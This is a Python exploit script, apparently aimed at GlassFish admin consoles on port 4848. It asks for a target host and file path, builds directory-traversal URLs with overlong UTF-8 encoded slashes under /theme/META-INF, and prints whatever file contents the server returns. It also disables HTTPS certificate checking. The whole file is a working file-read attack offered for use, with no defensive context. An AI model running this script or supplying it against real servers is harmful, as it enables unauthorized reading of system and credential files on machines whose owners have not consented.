#!/usr/bin/python3

import requests
import os
import ssl

if (not os.environ.get('PYTHONHTTPSVERIFY', '') and getattr(ssl, '_create_unverified_context', None)):
    ssl._create_default_https_context = ssl._create_unverified_context
print ("[*] Target URL format = https://www.mydomain.com:4848") 
host = input("[*] Enter target URL: ")

while True:

    print ("[*] Target file format = windows/win.ini")
    file = input("[*] Enter target file: ")
    pathnumber = int(input("Enter the number of dirs to add in the url (default is 12): "))
    # Initialize an empty string to hold the result
    result = ""
    text= "..%c0%af"
# Add the text to the result string 'number' times
    for _ in range(pathnumber):
        result += text
    paths = [
        "/theme/META-INF/prototype%c0%af..%c0%af" + result,
        "/theme/META-INF/json%c0%af..%c0%af" + result,
        "/theme/META-INF/dojo%c0%af..%c0%af" + result,
        "/theme/META-INF%c0%af..%c0%af"+ result,
        "/theme/com/sun%c0%af..%c0%af"+ result,
        "/theme/com%c0%af..%c0%af"+ result
        ]
    for url in paths:
        combined = host + url + file
        response = requests.get(combined)
    
        if response.status_code == 200:
            print(f"Successfully fetched content from {combined}")
            print("Content:")
            print(response.text)
            print("-" * 50)
        else:
            print(f"Failed to fetch content from {combined}. Status code: {response.status_code}")
